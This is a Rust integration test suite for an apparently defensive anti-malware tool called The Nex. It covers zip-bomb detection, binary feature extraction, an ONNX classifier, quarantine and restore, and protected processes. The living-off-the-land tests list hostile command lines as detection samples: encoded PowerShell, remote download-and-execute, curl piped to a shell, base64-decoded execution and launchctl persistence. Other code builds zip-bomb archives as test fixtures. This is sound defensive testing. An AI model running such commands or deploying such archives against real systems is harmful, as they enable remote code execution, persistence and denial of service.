//! End-to-end tests for The Nex through its public API and CLI: zip bombs, binary features,
//! the ONNX model, LotL rules, protected processes and the quarantine/restore round trip.

use std::fs;
use std::io::{Cursor, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Output};
use std::sync::atomic::{AtomicUsize, Ordering};

use the_nex::bin_ai::{self, BinaryAiScanner, FeatureVector};
use the_nex::config::{AppConfig, ZipLimits, AI_MALWARE_THRESHOLD};
use the_nex::engine::{classify_file, FileKind};
use the_nex::platform;
use the_nex::process_guard::{match_lotl, match_lotl_macos, CURL_PIPE_SHELL};
use the_nex::quarantine::{self, QuarantineMeta};
use the_nex::zip_bomb::{self, ZipThreatKind};
use zip::write::SimpleFileOptions;
use zip::{CompressionMethod, ZipWriter};

static COUNTER: AtomicUsize = AtomicUsize::new(0);

struct TempDir(PathBuf);

impl TempDir {
    fn new(tag: &str) -> Self {
        let path = std::env::temp_dir().join(format!(
            "thenex-it-{tag}-{}-{}",
            std::process::id(),
            COUNTER.fetch_add(1, Ordering::SeqCst)
        ));
        let _ = fs::remove_dir_all(&path);
        fs::create_dir_all(&path).unwrap();
        Self(path)
    }

    fn path(&self) -> &Path {
        &self.0
    }
}

impl Drop for TempDir {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn config_in(dir: &TempDir) -> AppConfig {
    let cfg = AppConfig::for_base_dir(&dir.path().join("TheNex"));
    cfg.ensure_dirs().unwrap();
    cfg
}

fn build_zip(files: &[(&str, &[u8])]) -> Vec<u8> {
    let mut cursor = Cursor::new(Vec::new());
    {
        let mut writer = ZipWriter::new(&mut cursor);
        for (name, data) in files {
            let options =
                SimpleFileOptions::default().compression_method(CompressionMethod::Deflated);
            writer.start_file(*name, options).unwrap();
            writer.write_all(data).unwrap();
        }
        writer.finish().unwrap();
    }
    cursor.into_inner()
}

/// `levels` archives in total: the outermost one plus `levels - 1` nested `.zip` entries.
fn nested_zip(levels: usize) -> Vec<u8> {
    let mut current = build_zip(&[("payload.txt", b"nested payload".as_slice())]);
    for level in (2..=levels).rev() {
        let name = format!("level{level}.zip");
        current = build_zip(&[(name.as_str(), current.as_slice())]);
    }
    current
}

fn crc32(data: &[u8]) -> u32 {
    let mut crc = 0xFFFF_FFFFu32;
    for &byte in data {
        crc ^= byte as u32;
        for _ in 0..8 {
            let mask = (crc & 1).wrapping_neg();
            crc = (crc >> 1) ^ (0xEDB8_8320 & mask);
        }
    }
    !crc
}

/// Non-recursive bomb shape: three central-directory records share one local file's data.
fn overlapping_zip() -> Vec<u8> {
    let data = vec![b'Z'; 64 * 1024];
    let crc = crc32(&data);
    let size = data.len() as u32;
    let local_name = b"kernel.bin";
    let mut out = Vec::new();
    out.extend_from_slice(&0x0403_4b50u32.to_le_bytes());
    out.extend_from_slice(&20u16.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&0x21u16.to_le_bytes());
    out.extend_from_slice(&crc.to_le_bytes());
    out.extend_from_slice(&size.to_le_bytes());
    out.extend_from_slice(&size.to_le_bytes());
    out.extend_from_slice(&(local_name.len() as u16).to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(local_name);
    out.extend_from_slice(&data);
    let cd_offset = out.len() as u32;
    let aliases: [&[u8]; 3] = [b"kernel.bin", b"alias-1.bin", b"alias-2.bin"];
    for name in aliases {
        out.extend_from_slice(&0x0201_4b50u32.to_le_bytes());
        out.extend_from_slice(&20u16.to_le_bytes());
        out.extend_from_slice(&20u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0x21u16.to_le_bytes());
        out.extend_from_slice(&crc.to_le_bytes());
        out.extend_from_slice(&size.to_le_bytes());
        out.extend_from_slice(&size.to_le_bytes());
        out.extend_from_slice(&(name.len() as u16).to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u16.to_le_bytes());
        out.extend_from_slice(&0u32.to_le_bytes());
        out.extend_from_slice(&0u32.to_le_bytes());
        out.extend_from_slice(name);
    }
    let cd_size = out.len() as u32 - cd_offset;
    out.extend_from_slice(&0x0605_4b50u32.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out.extend_from_slice(&(aliases.len() as u16).to_le_bytes());
    out.extend_from_slice(&(aliases.len() as u16).to_le_bytes());
    out.extend_from_slice(&cd_size.to_le_bytes());
    out.extend_from_slice(&cd_offset.to_le_bytes());
    out.extend_from_slice(&0u16.to_le_bytes());
    out
}

fn threat_kind(bytes: &[u8], limits: &ZipLimits) -> Option<ZipThreatKind> {
    zip_bomb::inspect_zip_bytes(bytes, limits).map(|threat| threat.kind)
}

fn file_threat_kind(dir: &TempDir, name: &str, bytes: &[u8]) -> Option<ZipThreatKind> {
    let cfg = config_in(dir);
    let path = dir.path().join(name);
    fs::write(&path, bytes).unwrap();
    assert_eq!(classify_file(&path), FileKind::Archive);
    zip_bomb::inspect_zip_file(&path, &cfg).map(|threat| threat.kind)
}

// ---------------------------------------------------------------- zip bombs

#[test]
fn benign_zip_is_allowed() {
    let bytes = build_zip(&[
        (
            "readme.txt",
            b"The Nex benign archive\n".repeat(50).as_slice(),
        ),
        ("data.csv", b"1,2,3\n4,5,6\n".as_slice()),
    ]);
    assert_eq!(threat_kind(&bytes, &ZipLimits::default()), None);
    let dir = TempDir::new("benign");
    assert_eq!(file_threat_kind(&dir, "benign.zip", &bytes), None);
}

#[test]
fn ratio_bomb_is_flagged_with_default_limits() {
    let zeros = vec![0u8; 20 * 1024 * 1024];
    let bytes = build_zip(&[("zeros.bin", zeros.as_slice())]);
    assert!(
        bytes.len() < 256 * 1024,
        "deflate should shrink 20 MiB of zeros"
    );
    assert_eq!(
        threat_kind(&bytes, &ZipLimits::default()),
        Some(ZipThreatKind::CompressionRatio)
    );
    let dir = TempDir::new("ratio");
    assert_eq!(
        file_threat_kind(&dir, "ratio_bomb.zip", &bytes),
        Some(ZipThreatKind::CompressionRatio)
    );
}

#[test]
fn nested_bomb_beyond_three_levels_is_flagged() {
    let limits = ZipLimits::default();
    assert_eq!(threat_kind(&nested_zip(3), &limits), None);
    let threat = zip_bomb::inspect_zip_bytes(&nested_zip(4), &limits)
        .expect("a 4-level nested archive must be flagged");
    assert_eq!(threat.kind, ZipThreatKind::NestingDepth);
    assert_eq!(threat.depth, 4);
    let dir = TempDir::new("nested");
    assert_eq!(
        file_threat_kind(&dir, "nested_bomb.zip", &nested_zip(4)),
        Some(ZipThreatKind::NestingDepth)
    );
}

#[test]
fn overlapping_header_bomb_is_flagged() {
    let bytes = overlapping_zip();
    assert_eq!(
        threat_kind(&bytes, &ZipLimits::default()),
        Some(ZipThreatKind::OverlappingEntries)
    );
    let dir = TempDir::new("overlap");
    assert_eq!(
        file_threat_kind(&dir, "overlap.zip", &bytes),
        Some(ZipThreatKind::OverlappingEntries)
    );
}

#[test]
fn declared_uncompressed_size_limit_is_enforced() {
    let limits = ZipLimits {
        max_uncompressed_bytes: 64 * 1024,
        ..ZipLimits::default()
    };
    let bytes = build_zip(&[("big.bin", vec![9u8; 128 * 1024].as_slice())]);
    assert_eq!(
        threat_kind(&bytes, &limits),
        Some(ZipThreatKind::UncompressedSize)
    );
}

#[test]
fn partial_downloads_and_non_archives_are_left_alone() {
    assert!(zip_bomb::is_ignored_extension(Path::new(
        "setup.zip.crdownload"
    )));
    assert!(zip_bomb::is_ignored_extension(Path::new("movie.part")));
    assert!(zip_bomb::is_ignored_extension(Path::new("x.quarantined")));
    assert!(!zip_bomb::is_ignored_extension(Path::new("x.zip")));
    assert_eq!(
        threat_kind(b"definitely not a zip", &ZipLimits::default()),
        None
    );
}

#[test]
fn generated_sandbox_samples_are_classified() {
    let sandbox = Path::new(env!("CARGO_MANIFEST_DIR")).join("test_sandbox");
    let names = ["benign.zip", "ratio_bomb.zip", "nested_bomb.zip"];
    if !names.iter().all(|name| sandbox.join(name).is_file()) {
        eprintln!("test_sandbox samples missing; run `python scripts/gen_test_zipbomb.py` to include them");
        return;
    }
    let scratch = TempDir::new("sandbox");
    let cfg = config_in(&scratch);
    let kind = |name: &str| {
        let path = sandbox.join(name);
        assert_eq!(classify_file(&path), FileKind::Archive, "{name}");
        zip_bomb::inspect_zip_file(&path, &cfg).map(|threat| threat.kind)
    };
    assert_eq!(kind("benign.zip"), None);
    assert_eq!(
        kind("ratio_bomb.zip"),
        Some(ZipThreatKind::CompressionRatio)
    );
    assert_eq!(kind("nested_bomb.zip"), Some(ZipThreatKind::NestingDepth));
}

// ---------------------------------------------------------- binary features

fn in_unit_range(features: &FeatureVector) -> bool {
    features.iter().all(|f| (0.0..=1.0).contains(f))
}

#[test]
fn shannon_entropy_is_exact_and_bounded() {
    assert_eq!(bin_ai::shannon_entropy(&[]), 0.0);
    assert_eq!(bin_ai::shannon_entropy(&[0x41; 4096]), 0.0);
    let two_symbols: Vec<u8> = (0..4096)
        .map(|i| if i % 2 == 0 { 0 } else { 255 })
        .collect();
    assert!((bin_ai::shannon_entropy(&two_symbols) - 1.0).abs() < 1e-12);
    let uniform: Vec<u8> = (0..=255u8).cycle().take(256 * 128).collect();
    assert!((bin_ai::shannon_entropy(&uniform) - 8.0).abs() < 1e-12);
    let mut state = 0x2545_F491_4F6C_DD1Du64;
    let noise: Vec<u8> = (0..1 << 20)
        .map(|_| {
            state ^= state << 13;
            state ^= state >> 7;
            state ^= state << 17;
            (state >> 24) as u8
        })
        .collect();
    let entropy = bin_ai::shannon_entropy(&noise);
    assert!(entropy > 7.99 && entropy <= 8.0, "noise entropy {entropy}");
}

#[test]
fn feature_vectors_are_normalized_for_any_input() {
    let extremes = [
        bin_ai::feature_vector(0, 0.0, 0, 0, 9),
        bin_ai::feature_vector(u64::MAX, 8.0, 10_000, 9, 9),
        bin_ai::feature_vector(1, f64::MAX, 1, 100, 9),
        bin_ai::feature_vector(64 * 1024, 4.0, 4, 3, 7),
        bin_ai::feature_vector(64 * 1024, 4.0, 4, 3, 0),
    ];
    for features in &extremes {
        assert!(in_unit_range(features), "{features:?}");
    }
}

#[test]
fn native_executable_yields_pe_or_macho_features_in_range() {
    let exe = std::env::current_exe().unwrap();
    let features = bin_ai::extract_features(&fs::read(&exe).unwrap())
        .expect("the test executable is a PE (Windows) or Mach-O (macOS) image");
    assert!(in_unit_range(&features), "{features:?}");
    assert!(features[0] > 0.0, "size feature");
    assert!(features[1] > 0.0, "section entropy feature");
    assert!(features[2] > 0.0, "section/segment count feature");
}

#[test]
fn malformed_headers_are_not_binaries() {
    let junk: [&[u8]; 5] = [
        b"",
        b"MZ",
        b"MZ\x90\x00 truncated portable executable",
        b"\xCF\xFA\xED\xFE truncated mach-o",
        b"\xCA\xFE\xBA\xBE\x00\x00\x00\x09 bogus fat header",
    ];
    for bytes in junk {
        assert_eq!(bin_ai::extract_features(bytes), None, "{bytes:?}");
    }
}

#[test]
fn heuristic_separates_benign_and_malicious_prototypes() {
    let benign = bin_ai::feature_vector(800 * 1024, 6.3, 6, 1, 9);
    let malicious = bin_ai::feature_vector(120 * 1024, 7.9, 3, 5, 9);
    let (b, m) = (
        bin_ai::heuristic_score(&benign),
        bin_ai::heuristic_score(&malicious),
    );
    assert!((0.0..=1.0).contains(&b) && (0.0..=1.0).contains(&m));
    assert!(b < AI_MALWARE_THRESHOLD, "benign {b}");
    assert!(m >= AI_MALWARE_THRESHOLD, "malicious {m}");
}

#[test]
fn scanner_scores_real_binaries_and_skips_everything_else() {
    let exe = std::env::current_exe().unwrap();
    let scanner = BinaryAiScanner::heuristic_only().with_max_scan_bytes(u64::MAX);
    let score = scanner
        .scan_file(&exe)
        .expect("the test executable must be scored");
    assert!((0.0..=1.0).contains(&score));
    assert_eq!(scanner.scan_file(&exe), Some(score), "cached score");

    let dir = TempDir::new("scanner");
    let text = dir.path().join("notes.txt");
    fs::write(&text, "not a binary").unwrap();
    assert_eq!(scanner.scan_file(&text), None);
    assert_eq!(scanner.scan_file(&dir.path().join("missing.exe")), None);

    let tiny = BinaryAiScanner::heuristic_only().with_max_scan_bytes(16);
    assert_eq!(
        tiny.scan_file(&exe),
        None,
        "files above the size cap are skipped"
    );
}

// ------------------------------------------------------------- ONNX model

/// THENEX_MODEL_PATH makes the model mandatory (CI); otherwise a model next to Cargo.toml is used if present.
fn model_path() -> Option<PathBuf> {
    if let Some(path) = std::env::var_os("THENEX_MODEL_PATH") {
        return Some(PathBuf::from(path));
    }
    let local = Path::new(env!("CARGO_MANIFEST_DIR")).join("thenex_model.onnx");
    local.is_file().then_some(local)
}

#[test]
fn tract_loads_trained_model_and_ranks_malicious_above_benign() {
    let Some(path) = model_path() else {
        eprintln!("thenex_model.onnx not found; run `python train_onnx.py` to include this test");
        return;
    };
    let scanner = BinaryAiScanner::load(&path);
    assert!(
        scanner.has_model(),
        "tract-onnx could not load {}",
        path.display()
    );
    assert_eq!(scanner.engine_name(), "onnx");

    let benign = [
        bin_ai::feature_vector(800 * 1024, 6.3, 6, 1, 9),
        bin_ai::feature_vector(5 * 1024 * 1024, 6.1, 7, 0, 9),
        bin_ai::feature_vector(2 * 1024 * 1024, 6.5, 5, 2, 9),
    ];
    let malicious = [
        bin_ai::feature_vector(120 * 1024, 7.9, 3, 5, 9),
        bin_ai::feature_vector(40 * 1024, 7.95, 2, 6, 9),
        bin_ai::feature_vector(300 * 1024, 7.7, 3, 4, 9),
    ];
    let benign_scores: Vec<f32> = benign.iter().map(|f| scanner.score_features(f)).collect();
    let malicious_scores: Vec<f32> = malicious
        .iter()
        .map(|f| scanner.score_features(f))
        .collect();
    for score in benign_scores.iter().chain(&malicious_scores) {
        assert!((0.0..=1.0).contains(score), "score {score}");
    }
    for score in &benign_scores {
        assert!(*score < AI_MALWARE_THRESHOLD, "benign scored {score}");
    }
    for score in &malicious_scores {
        assert!(*score >= AI_MALWARE_THRESHOLD, "malicious scored {score}");
    }
    let inference_ran = benign
        .iter()
        .chain(&malicious)
        .any(|f| (scanner.score_features(f) - bin_ai::heuristic_score(f)).abs() > 1e-4);
    assert!(
        inference_ran,
        "scores equal the heuristic; ONNX inference fell back"
    );
}

// ------------------------------------------------------------- LotL rules

#[test]
fn windows_lotl_patterns_are_detected() {
    let cases = [
        ("powershell.exe", "powershell -NoP -Enc SQBFAFgA", "-enc "),
        (
            "powershell.exe",
            "powershell -EncodedCommand ZQBjAGgAbwA=",
            "-encodedcommand",
        ),
        (
            "pwsh.exe",
            "pwsh -c Invoke-Expression $x",
            "invoke-expression",
        ),
        (
            "powershell.exe",
            "powershell -c \"(New-Object Net.WebClient).DownloadString('http://x')\"",
            "downloadstring",
        ),
        (
            "powershell.exe",
            "powershell [Convert]::FromBase64String($p)",
            "frombase64string",
        ),
        (
            "powershell.exe",
            "powershell -W Hidden -File a.ps1",
            "-w hidden",
        ),
        (
            "powershell.exe",
            "powershell -WindowStyle   Hidden a.ps1",
            "-windowstyle hidden",
        ),
        (
            "powershell.exe",
            "powershell -ep bypass -f a.ps1",
            "-ep bypass",
        ),
        (
            "cmd.exe",
            "cmd /c c^e^r^t^u^t^i^l -urlcache -f http://x/a.exe",
            "certutil -urlcache",
        ),
        ("wscript.exe", "wscript //b x.js -w hidden", "-w hidden"),
        ("mshta.exe", "mshta javascript:a=iex (1)", "iex "),
    ];
    for (name, cmdline, expected) in cases {
        assert_eq!(
            match_lotl(name, cmdline),
            Some(expected),
            "{name}: {cmdline}"
        );
    }
}

#[test]
fn macos_lotl_patterns_are_detected() {
    let cases = [
        (
            "bash",
            "bash -c 'curl -fsSL https://x/i.sh | bash'",
            CURL_PIPE_SHELL,
        ),
        (
            "zsh",
            "zsh -c curl -s http://x|sudo /bin/sh",
            CURL_PIPE_SHELL,
        ),
        ("sh", "sh -c echo aWQ= | base64 -D | sh", "base64 -d"),
        (
            "bash",
            "bash -c echo aWQ= | base64 --decode",
            "base64 --decode",
        ),
        (
            "osascript",
            "osascript -e 'do shell script \"id\"'",
            "osascript -e",
        ),
        (
            "sh",
            "sh -c launchctl load -w ~/Library/LaunchAgents/x.plist",
            "launchctl load",
        ),
        (
            "zsh",
            "zsh -c chmod +x /tmp/.x && /tmp/.x",
            "chmod +x /tmp/",
        ),
        (
            "bash",
            "bash -c chmod +x /private/tmp/p",
            "chmod +x /private/tmp/",
        ),
        (
            "python3",
            "python3 -c exec(__import__('base64').b64decode('cHJpbnQoMSk='))",
            "b64decode",
        ),
    ];
    for (name, cmdline, expected) in cases {
        assert_eq!(
            match_lotl_macos(name, cmdline),
            Some(expected),
            "{name}: {cmdline}"
        );
    }
}

#[test]
fn benign_commands_and_other_processes_are_not_flagged() {
    let windows_benign = [
        (
            "powershell.exe",
            "powershell -NoProfile -ExecutionPolicy RemoteSigned -File build.ps1",
        ),
        ("cmd.exe", "cmd /c cargo test --locked"),
        (
            "powershell.exe",
            "powershell Get-ChildItem -Recurse | Select-Object -First 5",
        ),
        ("notepad.exe", "notepad -enc report.txt"),
        ("chrome.exe", "chrome --windowstyle hidden"),
    ];
    for (name, cmdline) in windows_benign {
        assert_eq!(match_lotl(name, cmdline), None, "{name}: {cmdline}");
    }
    let macos_benign = [
        ("zsh", "zsh -c ls -la | grep src"),
        (
            "curl",
            "curl -fsSL -o setup.pkg https://example.com/setup.pkg",
        ),
        (
            "bash",
            "bash -c curl -s https://x/SHA256SUMS | shasum -a 256 -c",
        ),
        ("python3", "python3 -m http.server 8000"),
        (
            "osascript",
            "osascript - The Nex: ZIP_BOMB (HIGH) /tmp/a.zip",
        ),
        ("Safari", "Safari -e x"),
    ];
    for (name, cmdline) in macos_benign {
        assert_eq!(match_lotl_macos(name, cmdline), None, "{name}: {cmdline}");
    }
    assert_eq!(match_lotl("bash", "bash -c curl x | sh"), None);
    assert_eq!(
        match_lotl_macos("powershell.exe", "powershell -enc x"),
        None
    );
}

// ------------------------------------------------------ protected processes

#[test]
fn own_process_and_kernel_pids_are_protected() {
    let me = std::process::id();
    assert!(platform::is_protected_process(me, "the-nex"));
    assert!(platform::is_protected_process(me, "anything-else"));
    assert!(platform::is_protected_process(0, "idle"));
}

#[cfg(windows)]
#[test]
fn windows_system_processes_are_protected() {
    for name in [
        "explorer.exe",
        "Explorer.EXE",
        "csrss.exe",
        "lsass.exe",
        "winlogon.exe",
        "services.exe",
        "svchost.exe",
        "dwm.exe",
        "the-nex.exe",
    ] {
        assert!(platform::is_protected_process(4242, name), "{name}");
    }
    assert!(platform::is_protected_process(4, "System"));
    assert!(!platform::is_protected_process(4242, "dropper.exe"));
}

#[cfg(target_os = "macos")]
#[test]
fn macos_system_processes_are_protected() {
    for name in [
        "launchd",
        "kernel_task",
        "WindowServer",
        "Finder",
        "loginwindow",
        "Dock",
        "SystemUIServer",
        "the-nex",
    ] {
        assert!(platform::is_protected_process(4242, name), "{name}");
    }
    assert!(platform::is_protected_process(1, "launchd"));
    assert!(!platform::is_protected_process(4242, "dropper"));
}

// ------------------------------------------------- quarantine and restore

fn quarantine_victim(dir: &TempDir, cfg: &AppConfig, payload: &[u8]) -> (PathBuf, QuarantineMeta) {
    let victim = dir.path().join("Downloads").join("dropper.exe");
    fs::create_dir_all(victim.parent().unwrap()).unwrap();
    fs::write(&victim, payload).unwrap();
    let meta = quarantine::quarantine_file(&victim, cfg, "MALWARE_AI", "integration test").unwrap();
    (victim, meta)
}

fn meta_file(cfg: &AppConfig, id: &str) -> PathBuf {
    cfg.quarantine_dir.join(format!("{id}.meta.json"))
}

#[test]
fn quarantine_writes_meta_and_restore_round_trips() {
    let dir = TempDir::new("quarantine");
    let cfg = config_in(&dir);
    let payload = b"MZ\x90\x00 integration payload".to_vec();
    let expected_sha = {
        let probe = dir.path().join("probe.bin");
        fs::write(&probe, &payload).unwrap();
        quarantine::sha256_file(&probe).unwrap()
    };

    let (victim, meta) = quarantine_victim(&dir, &cfg, &payload);
    assert!(!victim.exists(), "original must be moved away");
    assert!(meta.quarantined_path.starts_with(&cfg.quarantine_dir));
    assert!(meta
        .quarantined_path
        .to_string_lossy()
        .ends_with("_dropper.exe.quarantined"));

    let stored: QuarantineMeta =
        serde_json::from_slice(&fs::read(meta_file(&cfg, &meta.id)).unwrap()).unwrap();
    assert_eq!(stored, meta);
    assert_eq!(stored.sha256, expected_sha);
    assert_eq!(stored.size, payload.len() as u64);
    assert_eq!(stored.original_path, victim);
    assert_eq!(stored.threat_type, "MALWARE_AI");

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(&meta.quarantined_path)
            .unwrap()
            .permissions()
            .mode();
        assert_eq!(mode & 0o777, 0o000, "quarantined file must be locked");
    }
    #[cfg(windows)]
    assert!(fs::metadata(&meta.quarantined_path)
        .unwrap()
        .permissions()
        .readonly());

    let restored = quarantine::restore_file(&meta.id, &cfg).unwrap();
    assert_eq!(restored.id, meta.id);
    assert_eq!(fs::read(&victim).unwrap(), payload);
    assert!(!meta.quarantined_path.exists());
    assert!(!meta_file(&cfg, &meta.id).exists());
    assert!(
        quarantine::restore_file(&meta.id, &cfg).is_err(),
        "second restore must fail"
    );
}

#[test]
fn restore_never_overwrites_and_rejects_tampering() {
    let dir = TempDir::new("restore-guards");
    let cfg = config_in(&dir);
    let (victim, meta) = quarantine_victim(&dir, &cfg, b"original bytes");

    fs::write(&victim, b"newer file at the same path").unwrap();
    let err = quarantine::restore_file(&meta.id, &cfg).unwrap_err();
    assert_eq!(err.kind(), std::io::ErrorKind::AlreadyExists);
    assert!(
        meta.quarantined_path.exists(),
        "quarantine copy must survive a refused restore"
    );
    fs::remove_file(&victim).unwrap();

    let mut forged = meta.clone();
    forged.sha256 = "0".repeat(64);
    fs::write(
        meta_file(&cfg, &meta.id),
        serde_json::to_vec(&forged).unwrap(),
    )
    .unwrap();
    let err = quarantine::restore_file(&meta.id, &cfg).unwrap_err();
    assert_eq!(err.kind(), std::io::ErrorKind::InvalidData);
    assert!(!victim.exists());

    fs::write(
        meta_file(&cfg, &meta.id),
        serde_json::to_vec(&meta).unwrap(),
    )
    .unwrap();
    quarantine::restore_file(&meta.id, &cfg).unwrap();
    assert_eq!(fs::read(&victim).unwrap(), b"original bytes");

    let err = quarantine::restore_file("..\\..\\escape", &cfg).unwrap_err();
    assert_eq!(err.kind(), std::io::ErrorKind::InvalidInput);
}

fn run_cli(args: &[&str], program_data: &Path) -> Output {
    Command::new(env!("CARGO_BIN_EXE_the-nex"))
        .args(args)
        .env("ProgramData", program_data)
        .output()
        .unwrap()
}

#[test]
fn cli_rejects_bad_arguments_and_restore_ids() {
    let dir = TempDir::new("cli-args");
    assert_eq!(run_cli(&["--bogus"], dir.path()).status.code(), Some(2));
    assert_eq!(
        run_cli(&["--install", "--dry-run"], dir.path())
            .status
            .code(),
        Some(2)
    );
    assert_eq!(run_cli(&["--restore"], dir.path()).status.code(), Some(2));
    let help = run_cli(&["--help"], dir.path());
    assert!(help.status.success());
    assert!(String::from_utf8_lossy(&help.stdout).contains("--restore <ID>"));
    let traversal = run_cli(&["--restore", "../../etc/passwd"], dir.path());
    assert_eq!(traversal.status.code(), Some(1));
    assert!(String::from_utf8_lossy(&traversal.stderr).contains("invalid quarantine ID"));
}

/// The Windows data root follows %ProgramData%, so the real `--restore` CLI can be pointed at a temp dir.
#[cfg(windows)]
#[test]
fn cli_restore_round_trip() {
    let dir = TempDir::new("cli-restore");
    let cfg = config_in(&dir);
    let (victim, meta) = quarantine_victim(&dir, &cfg, b"restored through the CLI");

    let output = run_cli(&["--restore", meta.id.as_str()], dir.path());
    assert!(
        output.status.success(),
        "stdout: {}\nstderr: {}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert_eq!(fs::read(&victim).unwrap(), b"restored through the CLI");
    assert!(!meta_file(&cfg, &meta.id).exists());
    let events = fs::read_to_string(&cfg.events_log).unwrap();
    assert!(events
        .lines()
        .filter_map(|line| serde_json::from_str::<quarantine::ThreatEvent>(line).ok())
        .any(|event| event.threat_type == "QUARANTINE_RESTORE"));
}
